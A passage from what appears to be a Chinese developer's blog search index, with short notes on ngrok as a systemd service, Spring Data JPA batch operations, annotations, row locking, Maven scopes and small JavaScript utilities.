KillSignal=SIGQUITTimeoutStopSec=5KillMode=processPrivateTmp=true[Install]WantedBy=multi-user.target</code></pre><ol start="2"><li>拷贝服务文件到系统指定目录</li></ol><blockquote><p>sudo cp ngrok.service /etc/systemd/system</p></blockquote><ol start="3"><li>加载到系统中</li></ol><blockquote><p>sudo systemctl daemon-reload</p></blockquote><ol start="4"><li>启动服务</li></ol><blockquote><p>sudo systemctl start ngrok.service</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JPA 批量增删改</title>
      <link href="/Spring/spring/jpa-batch-operation/"/>
      <url>/Spring/spring/jpa-batch-operation/</url>
      
        <content type="html"><![CDATA[<h2 id="批量增加"><a href="#批量增加" class="headerlink" title="批量增加"></a>批量增加</h2><p>可以自定义一个 Repository 的实现，然后使用 entitymanager 的 persist 语句完成。</p><pre><code>@Override    @Transactional    public &lt;S extends T&gt; Iterable&lt;S&gt; batchSave(Iterable&lt;S&gt; var1) {        Iterator&lt;S&gt; iterator = var1.iterator();        int index = 0;        while (iterator.hasNext()){            em.persist(iterator.next());            index++;            if (index % BATCH_SIZE == 0){                em.flush();                em.clear();            }        }        if (index % BATCH_SIZE != 0){            em.flush();            em.clear();        }        return var1;    }</code></pre><p>在application.properties,设置spring.jpa.properties.hibernate.jdbc.batch_size<br>在application.properties,设置spring.jpa.properties.hibernate.generate_statistics（只是为了检查批处理是否正常）<br>在application.properties设置JDBC URL中rewriteBatchedStatements=true （特定于MySQL的优化）<br>在application.properties设置 JDBC URL中使用cachePrepStmts=true（启用缓存，如果您决定设置prepStmtCacheSize，  则也很有用  prepStmtCacheSqlLimit;等等;如果没有此设置，则禁用缓存）<br>在application.properties设置 JDBC URL中useServerPrepStmts=true（通过这种方式切换到服务器端预处理语句（可能会显着提升性能））<br>在实体中，使用指定的生成器，  因为MySQL IDENTITY将导致批处理被禁用<br>在DAO中，不时刷新并清除持久性上下文。这样，您就可以避免“压跨”持久化上下文。</p><p>不建议使用 JPQL 语句进行批量增加，会有一些奇怪的问题，实际工作中更多的使用原生 SQL 进行批量的增加。</p><h2 id="批量删除"><a href="#批量删除" class="headerlink" title="批量删除"></a>批量删除</h2><pre><code>    @Modifying    @Query(&quot;delete from Feature&quot;)    void batchDeleteAll();</code></pre><p>需要注意，在 @Query 做数据修改时，需要机上 @Modifying 注解</p><h2 id="批量更新"><a href="#批量更新" class="headerlink" title="批量更新"></a>批量更新</h2><pre><code>    @Modifying    @Query(&quot;update Feature feature set feature.name = ?1&quot;)    void batchUpdateName(String newName);</code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring 中 @Async注解</title>
      <link href="/Spring/spring/spring-async/"/>
      <url>/Spring/spring/spring-async/</url>
      
        <content type="html"><![CDATA[<ol><li>注解的方法必须是public方法。</li><li>方法一定要从另一个类中调用，也就是从类的外部调用，类的内部调用是无效的。</li><li>如果需要从类的内部调用，需要先获取其代理类，下面上代码</li></ol><pre><code>@Servicepublic class XxxService{  public void methodA(){    ...    XxxService xxxServiceProxy = SpringUtil.getBean(XxxService.class);    xxxServiceProxy.methodB();    ...  }  @Async  public void methodB() {    ...  }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring 开启事务支持</title>
      <link href="/Spring/spring/Spring%20transaction/"/>
      <url>/Spring/spring/Spring%20transaction/</url>
      
        <content type="html"><![CDATA[<p>首先使用注解 @EnableTransactionManagement 开启事务支持后，然后在访问数据库的Service方法上添加注解 @Transactional 便可</p><p>Spring boot 会自动启用一个 TransactionMannager</p><p>如果不是使用 Spring  boot 需要做如下配置</p><pre><code>@Configuration@EnableJpaRepositories@EnableTransactionManagementclass ApplicationConfig {  @Bean  public DataSource dataSource() {    EmbeddedDatabaseBuilder builder = new EmbeddedDatabaseBuilder();    return builder.setType(EmbeddedDatabaseType.HSQL).build();  }  @Bean  public LocalContainerEntityManagerFactoryBean entityManagerFactory() {    HibernateJpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();    vendorAdapter.setGenerateDdl(true);    LocalContainerEntityManagerFactoryBean factory = new LocalContainerEntityManagerFactoryBean();    factory.setJpaVendorAdapter(vendorAdapter);    factory.setPackagesToScan(&quot;com.acme.domain&quot;);    factory.setDataSource(dataSource());    return factory;  }  @Bean  public PlatformTransactionManager transactionManager(EntityManagerFactory entityManagerFactory) {    JpaTransactionManager txManager = new JpaTransactionManager();    txManager.setEntityManagerFactory(entityManagerFactory);    return txManager;  }}</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/u010963948/article/details/79208328" target="_blank" rel="noopener">https://blog.csdn.net/u010963948/article/details/79208328</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring data JPA</title>
      <link href="/Spring/spring/spring-data/"/>
      <url>/Spring/spring/spring-data/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring、Spring-data-和-Spring-data-JPA-的关系"><a href="#Spring、Spring-data-和-Spring-data-JPA-的关系" class="headerlink" title="Spring、Spring data 和 Spring data JPA 的关系"></a>Spring、Spring data 和 Spring data JPA 的关系</h2><p>Spring data JPA 是 Java 服务器开发中最容易混淆的一堆概念。</p><ul><li>Spring，众所周知是一个轻量级的 IOC 容器，用来处理对象实例（Bean）之间的关系。</li><li>Spring data，是 Spring Framework 生态下用来访问数据的一个模块。</li><li>JPA，是 Java persistence API 的缩写，Java 用来抽象访问数据库的规范，主要实现有 Hibernate、TopLink 等 ORM 库。</li><li>Spirng data JPA，是 Spring data 项目的一个主要模块，用来封装 JPA 实现，并增加了一些便利的方法。如果直接使用 Hibernate 还是需要编写类似于 SQL 的 JPQL 的查询语言。但使用 Spring data JPA 可以实现类似 <code>findById()</code> 一类基本操作的方法。</li></ul><p>Spring Data 的一些属于版本火车的子项目：</p><ul><li>Spring Data Commons</li><li>Spring Data JPA</li><li>Spring Data KeyValue</li><li>Spring Data LDAP</li><li>Spring Data MongoDB</li><li>Spring Data Redis</li><li>Spring Data REST</li><li>Spring Data for Apache Cassandra</li><li>Spring Data for Apache Geode</li><li>Spring Data for Apache Solr</li><li>Spring Data for Pivotal GemFire</li><li>Spring Data Couchbase (community module)</li><li>Spring Data Elasticsearch (community module)</li><li>Spring Data Neo4j (community module)</li></ul><p>版本火车指的是，不同的独立子项目会保持同步的发布节奏，如果使用 Spring boot，也会随着 parent pom 变化，避免版本不一致导致的问题。</p><h2 id="Spring-Data-JPA-主要特性"><a href="#Spring-Data-JPA-主要特性" class="headerlink" title="Spring Data JPA 主要特性"></a>Spring Data JPA 主要特性</h2><ul><li>辅助查询 <code>findByxx</code></li><li>支持使用 Querydsl 复杂统一的查询方法</li><li>分页、排序</li><li>启动时检查 <code>@Query</code> 有效性</li></ul><h2 id="Spring-Data-JPA-的主要类"><a href="#Spring-Data-JPA-的主要类" class="headerlink" title="Spring Data JPA 的主要类"></a>Spring Data JPA 的主要类</h2><p>从 SimpleJpaRepository 的实现开，使用 idea 分析出类图。</p><p><img src="/Spring/spring/spring-data/simple-jpa-repository-diagram.png" alt="SimpleJpaRepository"></p><ul><li>EntityManagerFactory EntityManager 的工厂类</li><li>EntityManager 一个接口，管理持久化操作的对象</li><li>Entity 实体是持久性对象，对应存储在数据库中的记录</li><li>EntityTransaction 和 EntityManager 是一对一关系，提供事务支持</li><li>Persistence 包含静态方法，获取 EntityManagerFactory 实例</li><li>Query 该接口由每个 JPA 供应商提供，用于数据查询</li></ul><h2 id="快速入门教程"><a href="#快速入门教程" class="headerlink" title="快速入门教程"></a>快速入门教程</h2><p><a href="https://spring.io/guides/gs/accessing-data-jpa/" target="_blank" rel="noopener">https://spring.io/guides/gs/accessing-data-jpa/</a></p><h2 id="常见的查询方法"><a href="#常见的查询方法" class="headerlink" title="常见的查询方法"></a>常见的查询方法</h2><p>查询方法策略就是Spring Data如何从 repository 中找到合适的查询方法。有一下几种</p><ul><li>CREATE 尝试从查询方法名称构造特定于仓库的查询。例如 findByName，根据约定有以下几种查询方式：<ul><li>find…By</li><li>read…By</li><li>query…By</li><li>count…By</li><li>get…By</li></ul></li><li>USE_DECLARED_QUERY 会从 repository 中定义的方法中寻找合适的查询方式</li><li>CREATE_IF_NOT_FOUND 这是 JPA 默认的策略，组合CREATE和USE_DECLARED_QUERY</li></ul><p>CREATE 策略的几个例子：</p><pre><code>interface PersonRepository extends Repository&lt;User, Long&gt; {  List&lt;Person&gt; findByEmailAddressAndLastname(EmailAddress emailAddress, String lastname);  // Enables the distinct flag for the query  List&lt;Person&gt; findDistinctPeopleByLastnameOrFirstname(String lastname, String firstname);  List&lt;Person&gt; findPeopleDistinctByLastnameOrFirstname(String lastname, String firstname);  // Enabling ignoring case for an individual property  List&lt;Person&gt; findByLastnameIgnoreCase(String lastname);  // Enabling ignoring case for all suitable properties  List&lt;Person&gt; findByLastnameAndFirstnameAllIgnoreCase(String lastname, String firstname);  // Enabling static ORDER BY for a query  List&lt;Person&gt; findByLastnameOrderByFirstnameAsc(String lastname);  List&lt;Person&gt; findByLastnameOrderByFirstnameDesc(String lastname);}</code></pre><ul><li><p>表达式通常是属性遍历和可以连接的运算符。您可以使用组合属性表达式AND和OR。您还可以得到这样的运营商为支撑Between，LessThan，GreaterThan，和Like该属性的表达式。受支持的操作员可能因数据存储而异，因此请参阅相应部分的参考文档。</p></li><li><p>方法解析器支持IgnoreCase为单个属性（例如，findByLastnameIgnoreCase(…)）或支持忽略大小写的类型的所有属性（通常为String实例 - 例如findByLastnameAndFirstnameAllIgnoreCase(…)）设置标志。支持忽略情况的方式可能因商店而异，因此请参阅参考文档中的相关部分以获取特定于商店的查询方法。</p></li><li><p>您可以通过OrderBy向引用属性的查询方法附加子句并提供排序方向（Asc或Desc）来应用静态排序。</p></li></ul><p>分页的情况</p><pre><code>Page&lt;User&gt; findByLastname(String lastname, Pageable pageable);Slice&lt;User&gt; findByLastname(String lastname, Pageable pageable);List&lt;User&gt; findByLastname(String lastname, Sort sort);List&lt;User&gt; findByLastname(String lastname, Pageable pageable);</code></pre><h2 id="一对多级联存储"><a href="#一对多级联存储" class="headerlink" title="一对多级联存储"></a>一对多级联存储</h2><p>一对多的级联存储时，需要配置好关联关系，然后将自增ID置空即可。</p><pre><code> Feature ageFeature = new Feature();        ageFeature.setName(&quot;年龄&quot;);        ageFeature.setStep(2);        ageFeature.setFeatureValues(Arrays.asList(                new FeatureValue(null, &quot;10-20&quot;, ageFeature),                new FeatureValue(null, &quot;20-30&quot;, ageFeature)        ));        return ageFeature;</code></pre><h2 id="UUID-生成策略"><a href="#UUID-生成策略" class="headerlink" title="UUID 生成策略"></a>UUID 生成策略</h2><pre><code>    @Id    @GeneratedValue(generator = &quot;UUID&quot;)    @GenericGenerator(name = &quot;UUID&quot;, strategy = &quot;org.hibernate.id.UUIDGenerator&quot;)    private String id;</code></pre><h2 id="Entity-实例里面常用注解"><a href="#Entity-实例里面常用注解" class="headerlink" title="@Entity 实例里面常用注解"></a>@Entity 实例里面常用注解</h2><h3 id="Entity"><a href="#Entity" class="headerlink" title="@Entity"></a>@Entity</h3><p>javax.persistence 包中提供，设置该对象会被 JPA 管理，并映射到指定的数据库表。</p><p>这个类可以给一个名字。</p><h3 id="Table"><a href="#Table" class="headerlink" title="@Table"></a>@Table</h3><p>指定数据库表名</p><pre><code>// 表名，可以使用命名策略设置约定的名字String name() default &quot;&quot;;// 数据库抽象概念,用于处理table 的命名冲突String catalog() default &quot;&quot;;// 一般来说，是指数据库名String schema() default &quot;&quot;;// 唯一约束，如果不使用 JPA 自动建表不用管UniqueConstraint[] uniqueConstraints() default {};// 索引，建表时候使用，一般来说不需要Index[] indexes() default {};</code></pre><h3 id="ID"><a href="#ID" class="headerlink" title="@ID"></a>@ID</h3><p>指定为实体的主键，JPA 兼容遗留系统，使用复合主键。@IdClass </p><p>不过推荐不使用。</p><h3 id="GeneratedValue"><a href="#GeneratedValue" class="headerlink" title="@GeneratedValue"></a>@GeneratedValue</h3><p>主键生成策略 GenerationType 中定义了四种主键生成策略</p><ul><li>TABLE 通过表序列生成，框架模拟表增长</li><li>SEQUENCE 采用数据库序列增长，MySQL 不支持这种方式</li><li>IDENTITY 使用表主键的自动增长</li><li>AUTO 自动选择，默认设置选项，但不推荐使用</li></ul><h3 id="Basic"><a href="#Basic" class="headerlink" title="@Basic"></a>@Basic</h3><p>属性到数据库字段的映射，如果实体属性上没有任何注解，默认为@Basic</p><p>使用 @Basic 提供了额外懒加载的特性，对大字段非常有用</p><h3 id="Transient"><a href="#Transient" class="headerlink" title="@Transient"></a>@Transient</h3><p>设置为忽略，表明该字段不会被持久化。使用上和 @Basic 相反，JPA 映射数据库的时候选择忽略它。</p><h3 id="Column"><a href="#Column" class="headerlink" title="@Column"></a>@Column</h3><p>定义实体属性和数据库字段的列名，这个注解的参数比较多。</p><pre><code>// 列名String name() default &quot;&quot;;// 是否唯一boolean unique() default false;// 是否允许为空，用于建表时使用boolean nullable() default true;// 是否插入数据库boolean insertable() default true;// 是否运行更新数据库boolean updatable() default true;// 表名，用的比较少String table() default &quot;&quot;;// 下面三个用于创建表的属性设定int length() default 255;int precision() default 0;int scale() default 0;</code></pre><h3 id="Temporal"><a href="#Temporal" class="headerlink" title="@Temporal"></a>@Temporal</h3><p>Temporal 用于设置 Date 类型的属性到对应精度的字段。</p><ul><li>TemporalType.DATE 映射为日期</li><li>TemporalType.TIME 映射为时间</li><li>TemporalType.TIMESTAMP 映射为时间戳</li></ul><h3 id="Enumerated"><a href="#Enumerated" class="headerlink" title="Enumerated"></a>Enumerated</h3><pre><code>    @Enumerated(STRING)    private AccountRoles role;</code></pre><p>可以将字符串类型变成枚举类型，如果不使用这种方式，枚举会被自动转换为数字。如果将来发生变化，就无法映射回到正确的枚举值。需要注意的是，定义枚举时，如没有任何 valueOf的方法，在序列化和反序列化时对大小写敏感。</p><h3 id="Lob"><a href="#Lob" class="headerlink" title="@Lob"></a>@Lob</h3><p>建表时候映射为大字段</p><ul><li>如果是字符串类型会映射为 Clob 类型</li><li>如果是字节类型，会映射为 Blob</li></ul><h3 id="JoinColumn"><a href="#JoinColumn" class="headerlink" title="@JoinColumn"></a>@JoinColumn</h3><p>配合 @OneToOne、@OneToMany、ManyToOne 使用，单独使用没有意义。</p><p>@JoinColumn 多个字段的关联关系，很少用</p><h3 id="OneToOne"><a href="#OneToOne" class="headerlink" title="@OneToOne"></a>@OneToOne</h3><pre><code>// 默认当前字段的类型Class targetEntity() default void.class;// 级联操作类型CascadeType[] cascade() default {};1. CascadeType.ALL2. CascadeType.PERSIST3. CascadeType.MERGE4. CascadeType.REMOVE5. CascadeType.REFRESH6. CascadeType.DETACH// 是否懒加载FetchType fetch() default EAGER;// 是否为空 boolean optional() default true;// 配置对方拥有关系String mappedBy() default &quot;&quot;;// 是否允许级联删除boolean orphanRemoval() default false;</code></pre><p>@OneToOne 需要和 @JoinColumn(name = “solution_id”) 配合使用。</p><p>例如一个用户对应有一个头像</p><pre><code>    @OneToOne(cascade = CascadeType.ALL)    @JoinColumn(name = &quot;avatar_id&quot;)    private UserAvatar userAvatar;</code></pre><h3 id="OneToMany-和-ManyToOne"><a href="#OneToMany-和-ManyToOne" class="headerlink" title="@OneToMany 和 @ManyToOne"></a>@OneToMany 和 @ManyToOne</h3><p>这两个参数和 @OneToOne 差不多，也需要和 @JoinColumn 配合使用</p><pre><code>    @OneToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL)    @JoinColumn(name = &quot;feature_id&quot;)    private List&lt;FeatureValue&gt; featureValues;</code></pre><p>@OneToMany 需要额外配合使用的注解是 @OrderBy</p><p>在 @OneToMany 中，使用 @OrderBy 控制列表的顺序</p><pre><code>    @OneToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL)    @JoinColumn(name = &quot;feature_id&quot;)    @OrderBy(&quot;order DESC&quot;)    private List&lt;FeatureValue&gt; featureValues;</code></pre><h2 id="ManyToMany"><a href="#ManyToMany" class="headerlink" title="@ManyToMany"></a>@ManyToMany</h2><p>多对多一般发生在聚合根之间，其中有一个隐藏的关联表。</p><pre><code>    @ManyToMany    @JoinTable(name = &quot;product_feature_value&quot;,            joinColumns = {@JoinColumn(name = &quot;product_id&quot;, referencedColumnName = &quot;id&quot;)},            inverseJoinColumns = {@JoinColumn(name = &quot;feature_value_id&quot;, referencedColumnName = &quot;id&quot;)}    )    private List&lt;FeatureValue&gt; featureValues;</code></pre><p>一个 Product 有多个 FeatureValue，使用多对多需要引入 product_feature_value 中间表。</p><h2 id="EntityGraph-解决-N-1-条-SQL-的问题"><a href="#EntityGraph-解决-N-1-条-SQL-的问题" class="headerlink" title="@EntityGraph 解决 N+1 条 SQL 的问题"></a>@EntityGraph 解决 N+1 条 SQL 的问题</h2><p>使用一对多，多对多关联的时，会产生 N+1 条SQL，我们可以通过使用 Join 来避免这种情况。</p><p>使用 join 有三种方法</p><ul><li>@EntityGraph 在实体关联阶段解决</li><li>@Query JPQL</li><li>Criteria API 编写 JOIN 子句</li></ul><p>使用 @EntityGraph</p><p>现在实体上定义</p><pre><code>@Table(name = &quot;user&quot;)@NamedEntityGraph(name=&quot;userReadModel.department&quot;,attributeNodes={@NamedAttributeNode(&quot;department&quot;)})public class UserReadModel {    @ManyToOne    @JoinColumn(name = &quot;department_id&quot;)    private Department department;</code></pre><p>在查询的方法上使用即可</p><pre><code>@Repositorypublic interface UserReadModelRepository extends JpaRepository&lt;UserReadModel, Long&gt;,        JpaSpecificationExecutor&lt;UserReadModel&gt; {    @EntityGraph(value = &quot;userReadModel.department&quot; , type= EntityGraph.EntityGraphType.FETCH)    List&lt;UserReadModel&gt; findAll(@Nullable Specification&lt;UserReadModel&gt; spec);}</code></pre><h2 id="一些坑"><a href="#一些坑" class="headerlink" title="一些坑"></a>一些坑</h2><ol><li>@ManyToOne 如果 one 这一方不存在，会报错，即使设置了 Optional</li><li>应该使用 DDD 思想去设计关联，减少不必要的关联，聚合根之间不要关联。查询使用 join 完成</li><li>@OneToMany 关系默认懒加载会报错，应该设置为 Eager，或者使用 @Transactional 但是会带来性能开销</li><li>@OneToOne 本质上是实体和值对象的关系，统一使用实体的ID</li><li>@ManyToMany 默认会删除关联表</li><li>@Save  时候如果外键在对应表中，找不到目标记录会丢出错误,例如用户属于某个部门,拥有多个 Role</li></ol><pre><code>{  username:&quot;&quot;,  department:{    id: 1  },  roles:[    {      id:1    }  ]}</code></pre><p>当 role 的 ID 在数据库中不存在时，会报错，需要处理异常。</p><ol start="7"><li>当数据库插入异常，会报错，例如违反主键规则</li><li>更新、插入，只要不报错都会返回成功，无需再检查返回值</li></ol><h2 id="JPA-和建表规范"><a href="#JPA-和建表规范" class="headerlink" title="JPA 和建表规范"></a>JPA 和建表规范</h2><ul><li>根据 DDD 原则建表<ul><li>例如 user user_avatar user_role</li></ul></li></ul><h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><ol><li>不要有一些无意义的关联</li><li>使用 NamedEntityGraph 帮我们一次抓取数据，可以明显减少 SQL 数量</li></ol><h2 id="在-Spring-data-中使用-entityManager-直接操作数据"><a href="#在-Spring-data-中使用-entityManager-直接操作数据" class="headerlink" title="在 Spring data 中使用 entityManager 直接操作数据"></a>在 Spring data 中使用 entityManager 直接操作数据</h2><pre><code>  @Autowired  EntityManager entityManager;  Role role = entityManager.find(Role.class, savedRole.getId());  assertEquals(&quot;remark&quot;, role.getRemark());</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>示例项目 <a href="https://github.com/spring-projects/spring-data-examples/tree/master/jpa" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-examples/tree/master/jpa</a></li><li>Spring data  中文版本 <a href="https://blog.csdn.net/yongboyhood/article/details/81226553" target="_blank" rel="noopener">https://blog.csdn.net/yongboyhood/article/details/81226553</a></li><li>JPA 教程 <a href="https://www.yiibai.com/jpa/jpa-introduction.html" target="_blank" rel="noopener">https://www.yiibai.com/jpa/jpa-introduction.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java JPA 行锁</title>
      <link href="/Spring/spring/java-jpa-lock/"/>
      <url>/Spring/spring/java-jpa-lock/</url>
      
        <content type="html"><![CDATA[<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>当多个程序需要对同一个条数据访问，并发生争抢的情况，需要保证隔离性。例如在批量任务处理的场景下，job 1读取并更新一条数据时，job 2不应该修改这条数据。</p><p>原理为使用SQL的 select … for update 语句。当事务被提交后，锁应该被释放。</p><h2 id="使用JPA-实现"><a href="#使用JPA-实现" class="headerlink" title="使用JPA 实现"></a>使用JPA 实现</h2><p>JPA 中 Repository 中有如下定义：</p><pre><code>@Lock(value = LockModeType.PESSIMISTIC_WRITE)@Query(value = &quot;select t from Course t where t.id =?1 &quot;)Course queryAllById( Integer courseId);</code></pre><p>在业务代码中，应加上下面语句,当事务处理完后，for update才会将行级锁解除</p><pre><code>@Transactional(isolation = Isolation.READ_COMMITTED)</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/zc_ad/article/details/83578487" target="_blank" rel="noopener">https://blog.csdn.net/zc_ad/article/details/83578487</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Apache Mina</title>
      <link href="/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/network/mina/"/>
      <url>/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/network/mina/</url>
      
        <content type="html"><![CDATA[<p>Apache Mina 是一款网络通信框架，用来处理网络IO，提供低级、高级的网络相关的API。</p><p>类似框架：</p><ul><li>Grizzly</li><li>Netty 4</li><li>QuickServer</li><li>xSocket</li></ul><h2 id="https-en-wikipedia-org-wiki-Apache-MINA"><a href="#https-en-wikipedia-org-wiki-Apache-MINA" class="headerlink" title="https://en.wikipedia.org/wiki/Apache_MINA"></a><a href="https://en.wikipedia.org/wiki/Apache_MINA" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Apache_MINA</a></h2>]]></content>
      
      
      <categories>
          
          <category> 网络通信 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>maven 常见 scopes</title>
      <link href="/java/devops/maven-scopes/"/>
      <url>/java/devops/maven-scopes/</url>
      
        <content type="html"><![CDATA[<ol><li><p>compile 默认是compile。compile表示被依赖项目需要参与当前项目的编译，包括后续的测试，运行周期也参与其中，是一个比较强的依赖。打包的时候通常需要包含进去。</p></li><li><p>test 表示依赖项目仅仅参与测试相关的工作，包括测试代码的编译，执行。比较典型的如junit</p></li><li><p>runtime 表示被依赖项目无需参与项目的编译，不过后期的测试和运行周期需要其参与。与compile相比，跳过编译而已。在终端的项目（非开源，企业内部系统.中，和compile区别不是很大。比较常见的如JSRXXX的实现，对应的API jar是compile，具体实现是runtime的，compile只需要知道接口就足够了。oracle jdbc驱动jar包就是一个很好的例子，一般scope为runtime。  另runtime的依赖通常和optional搭配使用，optional为true。即可以用A实现也可以用B实现。</p></li><li><p>provide 意味着打包的时候可以不用包进去，别的设施（web container.会提供。事实上该依赖理论上可以参与编译、测试、运行等周期。相当于compile，但是打包阶段做了exclude的动作。</p></li><li><p>system 和provide相同，不过被依赖项不会从maven仓库抓，而是从本地系统文件拿，一定要配合systemPath使用</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 中常见的测试方案</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/java-testing/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/java-testing/</url>
      
        <content type="html"><![CDATA[<ul><li>单元测试</li><li>Spring mvc 下的集成测试</li><li>Spring boot 下的集成测试</li><li>Pact 测试</li><li>API 测试</li><li>JMH 微基准测试</li></ul><h2 id="常用的mock-工具"><a href="#常用的mock-工具" class="headerlink" title="常用的mock 工具"></a>常用的mock 工具</h2><ul><li>Powermock</li><li>Mockito</li><li>wiremock</li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JHipster</title>
      <link href="/java/devops/jhipster/"/>
      <url>/java/devops/jhipster/</url>
      
        <content type="html"><![CDATA[<p>一个Java脚手架, 用于生成，开发，部署Spring Boot + Angular/React Web Application和Spring microservices。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://www.jhipster.tech/" target="_blank" rel="noopener">https://www.jhipster.tech/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>spring-restdocs-asciidoctor</title>
      <link href="/API%E8%AE%BE%E8%AE%A1/restful-api/spring-restdocs-asciidoctor/"/>
      <url>/API%E8%AE%BE%E8%AE%A1/restful-api/spring-restdocs-asciidoctor/</url>
      
        <content type="html"><![CDATA[<p>Spring 提供的一套 rest API 文档生成工具，通过 adoc 文件生成漂亮的 API 文档。</p><h2 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h2><ul><li>使用契约文件</li><li>使用 Swagger</li></ul>]]></content>
      
      
      <categories>
          
          <category> API设计 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java service loader</title>
      <link href="/java/java/java-service-loader/"/>
      <url>/java/java/java-service-loader/</url>
      
        <content type="html"><![CDATA[<p>Java service loader 可以通过一个接口返回一组具体点实现，在实现策略模式时，特别有用。</p><p>在包 java.util.ServiceLoader 通过定义配置文件记载类的示例。</p><p>例如在 META-INF/services 中 定义一个文件，然后添加</p><pre><code>org.hadoop.java.HDFSServiceorg.hadoop.java.LocalService</code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java unmodifiableMap</title>
      <link href="/java/java/unmodifiableMap/"/>
      <url>/java/java/unmodifiableMap/</url>
      
        <content type="html"><![CDATA[<p>集合中提供了一个防止修改的方法</p><pre><code>public final Map&lt;Foo, Bar&gt; getMap(){    ...    return Collections.unmodifiableMap(map);}</code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>GraphQL</title>
      <link href="/API%E8%AE%BE%E8%AE%A1/restful-api/graphQL/"/>
      <url>/API%E8%AE%BE%E8%AE%A1/restful-api/graphQL/</url>
      
        <content type="html"><![CDATA[<p>GraphQL是一个开源的API数据查询和操作语言及实现为了实现上述操作的相应运行环境。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>标准官方网站 <a href="http://graphql.org/" target="_blank" rel="noopener">http://graphql.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> API设计 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>影响图 (Influence diagram)</title>
      <link href="/%E6%80%9D%E7%BB%B4%E5%B7%A5%E5%85%B7/methodology/influence-diagram/"/>
      <url>/%E6%80%9D%E7%BB%B4%E5%B7%A5%E5%85%B7/methodology/influence-diagram/</url>
      
        <content type="html"><![CDATA[<p>一种分析复杂问题的方法论，通过图表表达事物之间的关系和因果，即事物之间的相互影响。</p><p><img src="/思维工具/methodology/influence-diagram/simple-influence-diagram.svg" alt="例子"></p><p>例如：</p><p>天气预报-&gt;出行-&gt;心情</p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><ul><li><a href="https://en.wikipedia.org/wiki/Influence_diagram" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Influence_diagram</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 思维工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Javascript 复制到剪贴板</title>
      <link href="/Javascript/javascript/copy-to-clipboard/"/>
      <url>/Javascript/javascript/copy-to-clipboard/</url>
      
        <content type="html"><![CDATA[<pre><code>/** * 复制到剪贴板 * @param object * @param compareBy */function copyToClipboard(value, document = window.document) {  const element = document.createElement(&#39;input&#39;)  element.style.opacity = 0  element.value = value  document.body.appendChild(element)  element.select()  setTimeout(function () {    element.remove()  }, 0)  return document.execCommand(&#39;copy&#39;)}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Javascript 对URL中path参数绑定</title>
      <link href="/Javascript/javascript/http-params-in-path/"/>
      <url>/Javascript/javascript/http-params-in-path/</url>
      
        <content type="html"><![CDATA[<p>拼接URL在前端不是很好，例如 ‘/cate/‘+ cateID +’/post/‘+ postID</p><p>可以写成 <code>/cate/:cateID/post/:postID</code></p><pre><code>export function getParamlisedPath(pathString, ...params) {  let result = pathString  params.forEach((value) =&gt; {    result = result.replace(/\:\w+/, value)  })  return result}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Javascript 常用正则和方法</title>
      <link href="/Javascript/javascript/javascript-regular/"/>
      <url>/Javascript/javascript/javascript-regular/</url>
      
